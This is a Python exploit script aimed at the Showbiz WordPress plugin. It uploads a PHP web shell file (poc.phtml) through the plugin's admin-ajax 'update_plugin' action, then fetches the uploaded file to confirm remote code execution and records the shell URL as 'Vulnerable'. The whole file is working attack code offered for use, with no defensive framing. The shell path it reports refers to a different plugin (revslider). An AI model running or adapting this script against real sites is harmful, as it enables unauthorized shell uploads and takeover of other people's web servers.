import sys
import os
from pathlib import Path
try:
    # The insertion index should be 1 because index 0 is this file
    # the type of path is string
    sys.path.insert(1, '{}/help'.format(os.getcwd()))
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


shell = Path(__file__).parent.parent/'scripts/poc.phtml'
def exploit(url):
    try:
        req = request(url)
        found = []
        if not (url.startswith('https://') or url.startswith('http://')):
            url = 'http://' + url
        files = __path__ = os.path.join(
            Path(__file__).parent.parent, 'poc.phtml')
        _Post = req.post(url + "wp-admin/admin-ajax.php",
                         data={
                             'action': 'showbiz_ajax_action',
                             'client_action': 'update_plugin'
                         },
                         files={'update_file': open(shell, 'rb')})
        _response = req.get(
            url + 'wp-content/plugins/showbiz/temp/update_extract/poc.phtml')
        if "POC By ENG Yazeed" in _response.text or _response.status_code == 200 and len(
                _response.text) > 0:
            print(colors.yellow + "[+] ==> showbiz %s Vulnerable" % url)
            found.append({
                "url":
                url,
                "type":
                "showbiz RCE",
                "status":
                "Vulnerable",
                "shell":
                f"{url}/wp-content/plugins/revslider/temp/update_extract/poc.phtml",
            })
        else:
            print(colors.RED + "[-] ==> %s Not Vulnerable Showbiz" % url)

    except Exception as e:
        print("[-] %s Showbiz exploit Not Working on %s" % (e, url))
